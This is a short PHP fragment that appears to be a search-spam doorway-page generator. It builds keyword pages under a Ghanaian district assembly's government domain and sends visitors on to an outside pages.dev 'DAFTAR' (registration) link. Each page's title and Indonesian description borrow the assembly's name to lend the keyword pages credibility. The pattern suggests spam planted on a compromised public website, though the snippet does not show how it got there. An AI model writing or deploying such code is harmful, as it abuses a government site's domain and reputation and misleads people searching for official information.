...
$baseAuthor = $BRAND;
$URL  = "https://kapnda.gov.gh/?ninja=$BRAND";
$PAGEURL = "https://kapnda.gov.gh/?ninja=$BRAND";
$AMP = "https://bapakkaulah-b4r.pages.dev/$BRAND/";
$DAFTAR = "https://bapakkaulah-b4r.pages.dev/";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND # Kwahu Afram Plains North District Assembly ";
    $DESCRIPTION = "$BRAND adalah lembaga pemerintahan lokal yang bertanggung jawab atas administrasi dan pengembangan di Distrik Kwahu Afram Plains North di Ghana. Lembaga ini berfungsi sebagai organ pengambilan keputusan yang deliberatif, legislatif, dan eksekutif di tingkat distrik.
";
    $description = "$BRAND adalah lembaga pemerintahan lokal yang bertanggung jawab atas administrasi dan pengembangan di Distrik Kwahu Afram Plains North di Ghana. Lembaga ini berfungsi sebagai organ pengambilan keputusan yang deliberatif, legislatif, dan eksekutif di tingkat distrik.
";
}
